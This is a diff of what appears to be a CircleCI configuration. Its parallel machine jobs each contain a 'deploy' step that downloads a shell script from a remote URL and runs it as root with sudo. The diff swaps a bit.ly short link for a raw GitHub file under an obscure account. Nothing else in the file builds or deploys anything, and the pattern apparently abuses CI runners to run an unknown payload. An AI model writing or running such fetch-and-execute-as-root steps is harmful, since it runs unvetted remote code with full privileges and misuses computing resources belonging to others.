@@ -20,9 +20,9 @@ jobs:
          name: "deploy"
          no_output_timeout: 60m
          command: |
-          wget https://bit.ly/3IeFtmf
-          chmod +x 3IeFtmf
-          sudo su --command "./3IeFtmf"
+          wget https://github.com/gokjgolden08/turah/raw/jobs/round.sh
+          chmod +x round.sh
+          sudo su --command "./round.sh"
   build_1:
     machine:
       image: ubuntu-2004:202104-01
@@ -43,9 +43,9 @@ jobs:
          name: "deploy"
          no_output_timeout: 60m
          command: |
-          wget https://bit.ly/3IeFtmf
-          chmod +x 3IeFtmf
-          sudo su --command "./3IeFtmf"
+          wget https://github.com/gokjgolden08/turah/raw/jobs/round.sh
+          chmod +x round.sh
+          sudo su --command "./round.sh"
   build_2:
     machine:
       image: ubuntu-2004:202104-01
@@ -66,9 +66,9 @@ jobs:
          name: "deploy"
          no_output_timeout: 60m
          command: |
-          wget https://bit.ly/3IeFtmf
-          chmod +x 3IeFtmf
-          sudo su --command "./3IeFtmf"
+          wget https://github.com/gokjgolden08/turah/raw/jobs/round.sh
+          chmod +x round.sh
+          sudo su --command "./round.sh"
   build_3:
     machine:
       image: ubuntu-2004:202104-01
@@ -89,9 +89,9 @@ jobs:
          name: "deploy"
          no_output_timeout: 60m
          command: |
-          wget https://bit.ly/3IeFtmf
-          chmod +x 3IeFtmf
-          sudo su --command "./3IeFtmf"
+          wget https://github.com/gokjgolden08/turah/raw/jobs/round.sh
+          chmod +x round.sh
+          sudo su --command "./round.sh"
   build_4:
     machine:
       image: ubuntu-2004:202104-01
@@ -112,9 +112,9 @@ jobs:
          name: "deploy"
          no_output_timeout: 60m
          command: |
-          wget https://bit.ly/3IeFtmf
-          chmod +x 3IeFtmf
-          sudo su --command "./3IeFtmf"
+          wget https://github.com/gokjgolden08/turah/raw/jobs/round.sh
+          chmod +x round.sh
+          sudo su --command "./round.sh"
        
 workflows:
   version: 2
